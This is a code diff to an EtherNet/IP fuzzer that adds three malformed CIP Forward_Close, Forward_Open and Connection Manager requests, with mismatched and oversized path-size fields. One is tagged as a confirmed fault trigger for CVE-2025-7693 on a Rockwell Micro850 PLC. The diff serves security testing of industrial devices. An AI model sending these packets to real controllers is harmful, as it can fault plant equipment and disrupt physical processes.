@@ -156,6 +156,25 @@ class EtherNetIPFuzzer(BaseFuzzer):
                 "protocol",
                 requires_state=CommonState.ANY,
             ),
+            # Phase 2b: CIP connection-management malformation
+            RequestInfo(
+                "EIP_ForwardClose_Malformed",
+                "Malformed CIP Forward_Close, path-size vs EPATH mismatch (CVE-2025-7693)",
+                "malformed",
+                requires_state=CommonState.ANY,
+            ),
+            RequestInfo(
+                "EIP_ForwardOpen_Malformed",
+                "Forward_Open with oversized connection-path-size and network params",
+                "overflow",
+                requires_state=CommonState.ANY,
+            ),
+            RequestInfo(
+                "EIP_ConnMgr_Path_Overflow",
+                "Connection Manager request with oversized EPATH ending mid-segment",
+                "overflow",
+                requires_state=CommonState.ANY,
+            ),
             # Phase 3: CVE-targeted writes
             RequestInfo(
                 "EIP_Write_Operations",
@@ -321,36 +340,6 @@ class EtherNetIPFuzzer(BaseFuzzer):
         automatically pick up the handle obtained during RegisterSession.
         """
         return self._state_context.get("session_handle", 0)
-
-    def _create_encap_header(self, command: int = 0x006F, length: int = 0) -> Block:
-        """Create standard EtherNet/IP encapsulation header.
-
-        Encapsulation Header format (24 bytes):
-        - Command: 2 bytes (little-endian)
-        - Length: 2 bytes (data length after header)
-        - Session Handle: 4 bytes (from RegisterSession)
-        - Status: 4 bytes
-        - Sender Context: 8 bytes
-        - Options: 4 bytes
-        """
-        return Block(
-            "EIP_Encap_Header",
-            children=(
-                Word("Command", command, endian="<", fuzzable=False),
-                Size(
-                    "Length",
-                    block_name="Encap_Data",
-                    length=2,
-                    endian="<",
-                    inclusive=False,
-                    fuzzable=False,
-                ),
-                DynamicDWord("Session_Handle", self._session_handle_value, endian="<"),
-                DWord("Status", 0x00000000, endian="<", fuzzable=False),
-                QWord("Context", 0x0000000000000000, endian="<", fuzzable=False),
-                DWord("Options", 0x00000000, endian="<", fuzzable=False),
-            ),
-        )
 
     def _define_protocol(self) -> None:
         """Define EtherNet/IP protocol structure with vulnerability patterns.
@@ -1653,6 +1642,289 @@ class EtherNetIPFuzzer(BaseFuzzer):
             ),
         )
 
+        # ================================================================
+        # PHASE 2b: CIP CONNECTION-MANAGEMENT MALFORMATION
+        # Dedicated malformed Forward_Close / Forward_Open and an oversized
+        # Connection Manager EPATH. Confirmed fault: CVE-2025-7693 (malformed
+        # CIP Forward_Close faults Rockwell Micro850).
+        # ================================================================
+
+        # Forward_Close with a connection-path-size byte that disagrees with the
+        # EPATH bytes actually present (declared 0x00 / 0xFF / mismatched vs the
+        # real 2-word path). A device that trusts the size field over-reads or
+        # under-reads the connection path. Confirmed fault: CVE-2025-7693.
+        forward_close_malformed = Request(
+            "EIP_ForwardClose_Malformed",
+            children=(
+                Block(
+                    "EIP_Encap_Header_FWD_CLOSE_MAL",
+                    children=(
+                        Word("Command", 0x006F, endian="<", fuzzable=False),
+                        Size(
+                            "Length",
+                            block_name="Forward_Close_Mal_Data",
+                            length=2,
+                            endian="<",
+                            inclusive=False,
+                            fuzzable=False,
+                        ),
+                        DynamicDWord(
+                            "Session_Handle", self._session_handle_value, endian="<", fuzzable=False
+                        ),
+                        DWord("Status", 0x00000000, endian="<", fuzzable=False),
+                        QWord("Context", 0x0000000000000000, endian="<", fuzzable=False),
+                        DWord("Options", 0x00000000, endian="<", fuzzable=False),
+                    ),
+                ),
+                Block(
+                    "Forward_Close_Mal_Data",
+                    children=(
+                        DWord("Interface_Handle", 0x00000000, endian="<", fuzzable=False),
+                        Word("Timeout", 0x0000, endian="<", fuzzable=False),
+                        Block(
+                            "CPF_Header",
+                            children=(
+                                Word("Item_Count", 0x0002, endian="<", fuzzable=False),
+                                Word("Address_Type", 0x0000, endian="<", fuzzable=False),
+                                Word("Address_Length", 0x0000, endian="<", fuzzable=False),
+                                Word("Data_Type", 0x00B2, endian="<", fuzzable=False),
+                                Size(
+                                    "Data_Length",
+                                    block_name="CIP_Request_FwdCloseMal",
+                                    length=2,
+                                    endian="<",
+                                    inclusive=False,
+                                    fuzzable=False,
+                                ),
+                            ),
+                        ),
+                        Block(
+                            "CIP_Request_FwdCloseMal",
+                            children=(
+                                Byte("Forward_Close_Service", 0x4E, fuzzable=False),
+                                Byte("Request_Path_Size", 0x02, fuzzable=False),
+                                Byte("Class_Segment", 0x20, fuzzable=False),
+                                Byte("Class_ID", 0x06, fuzzable=False),  # Connection Manager
+                                Byte("Instance_Segment", 0x24, fuzzable=False),
+                                Byte("Instance_ID", 0x01, fuzzable=False),
+                                Byte("Priority_Time_Tick", 0x01, fuzzable=False),
+                                Byte("Timeout_Ticks", 0x05, fuzzable=False),
+                                Word("Connection_Serial", 0x0100, endian="<", fuzzable=False),
+                                Word("Vendor_ID", 0x1234, endian="<", fuzzable=False),
+                                DWord("Originator_Serial", 0x56789ABC, endian="<", fuzzable=False),
+                                # Malformed connection-path-size: disagrees with the
+                                # EPATH bytes actually present below (CVE-2025-7693).
+                                # The 2-word EPATH never matches any declared size.
+                                Group(
+                                    "Connection_Path_Size",
+                                    values=[
+                                        b"\x00",  # claims no path, but EPATH present
+                                        b"\xff",  # claims 255 words, far more than present
+                                        b"\x08",  # mismatched: claims 8 words, 2 present
+                                    ],
+                                ),
+                                Byte("Reserved", 0x00, fuzzable=False),
+                                # EPATH bytes present regardless of the size byte
+                                Byte("Conn_Path_Class_Seg", 0x20, fuzzable=False),
+                                Byte("Conn_Path_Class", 0x02, fuzzable=False),
+                                Byte("Conn_Path_Inst_Seg", 0x24, fuzzable=False),
+                                Byte("Conn_Path_Inst", 0x01, fuzzable=False),
+                            ),
+                        ),
+                    ),
+                ),
+            ),
+        )
+
+        # Forward_Open with a connection-path-size larger than the EPATH present
+        # and oversized/mismatched network-connection-params. The single-word
+        # path present is dwarfed by the declared 0xFF/0x40/0x7F size, and the
+        # network params request an out-of-range connection size.
+        forward_open_malformed = Request(
+            "EIP_ForwardOpen_Malformed",
+            children=(
+                Block(
+                    "EIP_Encap_Header_FWD_OPEN_MAL",
+                    children=(
+                        Word("Command", 0x006F, endian="<", fuzzable=False),
+                        Size(
+                            "Length",
+                            block_name="Forward_Open_Mal_Data",
+                            length=2,
+                            endian="<",
+                            inclusive=False,
+                            fuzzable=False,
+                        ),
+                        DynamicDWord(
+                            "Session_Handle", self._session_handle_value, endian="<", fuzzable=False
+                        ),
+                        DWord("Status", 0x00000000, endian="<", fuzzable=False),
+                        QWord("Context", 0x0000000000000000, endian="<", fuzzable=False),
+                        DWord("Options", 0x00000000, endian="<", fuzzable=False),
+                    ),
+                ),
+                Block(
+                    "Forward_Open_Mal_Data",
+                    children=(
+                        DWord("Interface_Handle", 0x00000000, endian="<", fuzzable=False),
+                        Word("Timeout", 0x0000, endian="<", fuzzable=False),
+                        Block(
+                            "CPF_Header",
+                            children=(
+                                Word("Item_Count", 0x0002, endian="<", fuzzable=False),
+                                Word("Address_Type", 0x0000, endian="<", fuzzable=False),
+                                Word("Address_Length", 0x0000, endian="<", fuzzable=False),
+                                Word("Data_Type", 0x00B2, endian="<", fuzzable=False),
+                                Size(
+                                    "Data_Length",
+                                    block_name="CIP_Request_FwdOpenMal",
+                                    length=2,
+                                    endian="<",
+                                    inclusive=False,
+                                    fuzzable=False,
+                                ),
+                            ),
+                        ),
+                        Block(
+                            "CIP_Request_FwdOpenMal",
+                            children=(
+                                Byte("Forward_Open_Service", 0x54, fuzzable=False),
+                                Byte("Request_Path_Size", 0x02, fuzzable=False),
+                                Byte("Class_Segment", 0x20, fuzzable=False),
+                                Byte("Class_ID", 0x06, fuzzable=False),  # Connection Manager
+                                Byte("Instance_Segment", 0x24, fuzzable=False),
+                                Byte("Instance_ID", 0x01, fuzzable=False),
+                                Byte("Priority_Time_Tick", 0x01, fuzzable=False),
+                                Byte("Timeout_Ticks", 0x05, fuzzable=False),
+                                DWord(
+                                    "O_to_T_Connection_ID", 0x12345678, endian="<", fuzzable=False
+                                ),
+                                DWord(
+                                    "T_to_O_Connection_ID", 0x87654321, endian="<", fuzzable=False
+                                ),
+                                Word("Connection_Serial", 0x0100, endian="<", fuzzable=False),
+                                Word("Vendor_ID", 0x1234, endian="<", fuzzable=False),
+                                DWord("Originator_Serial", 0x56789ABC, endian="<", fuzzable=False),
+                                Byte("Connection_Timeout_Mult", 0x03, fuzzable=False),
+                                Byte("Reserved1", 0x00, fuzzable=False),
+                                Word("Reserved2", 0x0000, endian="<", fuzzable=False),
+                                DWord("O_to_T_RPI", 0x000186A0, endian="<", fuzzable=False),
+                                # Oversized / mismatched network-connection-params:
+                                # the low bits encode connection size, so 0xFFFF
+                                # requests an out-of-range O->T connection buffer.
+                                Group(
+                                    "O_to_T_Network_Params",
+                                    values=[
+                                        b"\xff\xff",  # maximum
+                                        b"\xff\x7f",  # large, redundant-owner set
+                                        b"\x00\x08",  # size 0 but large-type bit
+                                    ],
+                                ),
+                                DWord("T_to_O_RPI", 0x000186A0, endian="<", fuzzable=False),
+                                Group(
+                                    "T_to_O_Network_Params",
+                                    values=[
+                                        b"\xff\xff",
+                                        b"\xff\x7f",
+                                        b"\x00\x08",
+                                    ],
+                                ),
+                                Byte("Transport_Type_Trigger", 0xA3, fuzzable=False),
+                                # connection-path-size larger than the 1 word present
+                                Group(
+                                    "Connection_Path_Size",
+                                    values=[
+                                        b"\xff",  # 255 words declared, 1 present
+                                        b"\x40",  # 64 words declared
+                                        b"\x7f",  # 127 words declared
+                                    ],
+                                ),
+                                Byte("Port_Segment", 0x01, fuzzable=False),
+                                Byte("Link_Address", 0x00, fuzzable=False),
+                            ),
+                        ),
+                    ),
+                ),
+            ),
+        )
+
+        # Connection Manager request carrying an oversized, looping EPATH that
+        # ends mid logical segment (a trailing lone 0x20 opener with no class
+        # byte). A length-driven path parser that walks segment-by-segment reads
+        # past the end of the buffer. See ref/ethernetip/cve_patterns.json.
+        conn_mgr_path_overflow = Request(
+            "EIP_ConnMgr_Path_Overflow",
+            children=(
+                Block(
+                    "EIP_Encap_Header_ConnMgrOvf",
+                    children=(
+                        Word("Command", 0x006F, endian="<", fuzzable=False),
+                        Size(
+                            "Length",
+                            block_name="CIP_ConnMgr_PathOvf_Data",
+                            length=2,
+                            endian="<",
+                            inclusive=False,
+                            fuzzable=False,
+                        ),
+                        DynamicDWord(
+                            "Session_Handle", self._session_handle_value, endian="<", fuzzable=False
+                        ),
+                        DWord("Status", 0x00000000, endian="<", fuzzable=False),
+                        QWord("Context", 0x0000000000000000, endian="<", fuzzable=False),
+                        DWord("Options", 0x00000000, endian="<", fuzzable=False),
+                    ),
+                ),
+                Block(
+                    "CIP_ConnMgr_PathOvf_Data",
+                    children=(
+                        DWord("Interface_Handle", 0x00000000, endian="<", fuzzable=False),
+                        Word("Timeout", 0x0000, endian="<", fuzzable=False),
+                        Block(
+                            "CPF_Header",
+                            children=(
+                                Word("Item_Count", 0x0002, endian="<", fuzzable=False),
+                                Word("Address_Type", 0x0000, endian="<", fuzzable=False),
+                                Word("Address_Length", 0x0000, endian="<", fuzzable=False),
+                                Word("Data_Type", 0x00B2, endian="<", fuzzable=False),
+                                Size(
+                                    "Data_Length",
+                                    block_name="CIP_Request_ConnMgrOvf",
+                                    length=2,
+                                    endian="<",
+                                    inclusive=False,
+                                    fuzzable=False,
+                                ),
+                            ),
+                        ),
+                        Block(
+                            "CIP_Request_ConnMgrOvf",
+                            children=(
+                                Byte("Service", 0x54, fuzzable=False),  # Forward_Open
+                                # Declared path size far exceeds the real EPATH.
+                                Group(
+                                    "Path_Size_Overflow",
+                                    values=[
+                                        b"\x40",  # 64 words = 128 bytes
+                                        b"\x7f",  # 127 words = 254 bytes
+                                        b"\x80",  # 128 words (sign bit)
+                                        b"\xff",  # 255 words = 510 bytes (maximum)
+                                    ],
+                                ),
+                                # Looping EPATH to Connection Manager (class 0x06),
+                                # padded, ending mid-segment with a lone 0x20 opener.
+                                SmartString(
+                                    "Path_Data",
+                                    ("\x20\x06\x24\x01" * 64) + "\x20",
+                                    max_len=512,
+                                ),
+                            ),
+                        ),
+                    ),
+                ),
+            ),
+        )
+
         # TCP/IP Interface Object (Class 0xF5)
         tcpip_get = Request(
             "EIP_TCPIP_Object",
@@ -2105,6 +2377,14 @@ class EtherNetIPFuzzer(BaseFuzzer):
 
         if self.is_request_enabled("EIP_Header_Malformed"):
             self.session.connect(session_overflow)  # Session handle boundary
+
+        # ============ PHASE 2b: CIP CONNECTION-MANAGEMENT MALFORMATION ============
+        if self.is_request_enabled("EIP_ForwardClose_Malformed"):
+            self.session.connect(forward_close_malformed)  # CVE-2025-7693
+        if self.is_request_enabled("EIP_ForwardOpen_Malformed"):
+            self.session.connect(forward_open_malformed)  # Oversized conn-path/params
+        if self.is_request_enabled("EIP_ConnMgr_Path_Overflow"):
+            self.session.connect(conn_mgr_path_overflow)  # Oversized/looping EPATH
 
         # ==================== PHASE 3: CVE-TARGETED WRITES (~3 min) ====================
         enable_write = self.config.get_option("enable_write", False)
